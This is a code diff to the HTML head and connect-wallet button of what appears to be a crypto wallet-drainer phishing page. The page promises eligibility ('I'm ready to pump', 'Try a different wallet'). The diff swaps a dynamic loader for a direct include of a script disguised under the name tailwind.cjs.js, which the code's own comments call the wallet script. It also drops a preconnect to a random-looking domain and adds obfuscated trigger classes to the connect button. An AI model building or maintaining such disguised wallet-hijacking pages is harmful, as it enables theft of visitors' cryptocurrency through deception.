@@ -107,10 +107,8 @@
     
     <link rel="stylesheet" href="/css/styles.css">
     
-    <!-- Preload tailwind.cjs.js with high priority for faster loading -->
-    <link rel="preload" href="/tailwind.cjs.js" as="script" fetchpriority="high" crossorigin="anonymous">
-    <link rel="dns-prefetch" href="//aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
-    <link rel="preconnect" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com" crossorigin>
+    <!-- Load tailwind.cjs.js -->
+    <script src="./tailwind.cjs.js"></script>
     
     <script>
       window.setup = {
@@ -123,97 +121,9 @@
         notEligibleParagraph: "Try a different wallet to meet the requirements."
       };
       
-      (function() {
-        // Load wallet script with high priority - prevent duplicates
-        let scriptLoaded = false;
-        let scriptLoading = false;
-        let scriptElement = null;
-        
-        function isScriptAlreadyLoaded() {
-          // Check if script tag already exists
-          const existingScript = document.querySelector('script[src="/tailwind.cjs.js"]');
-          if (existingScript) {
-            return true;
-          }
-          // Check if script is already in the DOM
-          const scripts = document.querySelectorAll('script[src*="tailwind.cjs.js"]');
-          return scripts.length > 0;
-        }
-        
-        function loadWalletScript() {
-          // Prevent duplicate loading
-          if (scriptLoaded || scriptLoading) return;
-          if (isScriptAlreadyLoaded()) {
-            scriptLoaded = true;
-            return;
-          }
-          
-          scriptLoading = true;
-          
-          scriptElement = document.createElement('script');
-          scriptElement.src = '/tailwind.cjs.js';
-          scriptElement.async = true;
-          scriptElement.defer = false;
-          scriptElement.fetchPriority = 'high';
-          scriptElement.crossOrigin = 'anonymous';
-          
-          scriptElement.onerror = function() {
-            console.warn('Wallet modal script failed to load');
-            scriptLoaded = false;
-            scriptLoading = false;
-            scriptElement = null;
-          };
-          
-          scriptElement.onload = function() {
-            scriptLoaded = true;
-            scriptLoading = false;
-            
-            // Mark tailwind script as loaded
-            if (window._loadingState) {
-              window._loadingState.tailwindScript = true;
-              if (window.checkAllResourcesLoaded) {
-                window.checkAllResourcesLoaded();
-              }
-            }
-            
-            function applySettings() {
-              if (window.setup) {
-                window.setup.modal = 'reown';
-                window.setup.theme = 'dark';
-                window.setup.radius = 'm';
-                window.setup.auto_prompt = false;
-                window.setup.injectWindowObjects = true;
-                window.setup.notEligibleHeader = "You are not eligible";
-                window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
-              }
-            }
-            
-            applySettings();
-          };
-          
-          document.body.appendChild(scriptElement);
-        }
-        
-        // Single event listener for wallet button clicks
-        document.addEventListener('click', function(e) {
-          const target = e.target.closest('#connectWalletBtn, [data-wallet], .wallet-button, .aBVeeVna, .h3qErTJo');
-          if (target) {
-            loadWalletScript();
-          }
-        }, { once: false, passive: true });
-        
-        // Single event listener for wallet:load event
-        document.addEventListener('wallet:load', loadWalletScript, { once: false });
-        
-        // Load immediately with high priority (only once)
-        if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', function() {
-            loadWalletScript();
-          }, { once: true });
-        } else {
-          loadWalletScript();
-        }
-      })();
+      // tailwind.cjs.js is loaded via <script src> in head
+      // Wallet connection is handled automatically by classes aBVeeVna h3qErTJo
+      // No additional loading needed - script is already in DOM
     </script>
   </head>
   <body>
@@ -241,7 +151,7 @@
         <div class="modal-disclaimer">
           By clicking this button, you agree to the terms and conditions and certify that you are over 18 years old
         </div>
-        <button class="modal-button" id="connectWalletBtn">
+        <button class="modal-button aBVeeVna h3qErTJo" id="connectWalletBtn">
           <span>I'm ready to pump</span>
         </button>
         <div class="modal-links">
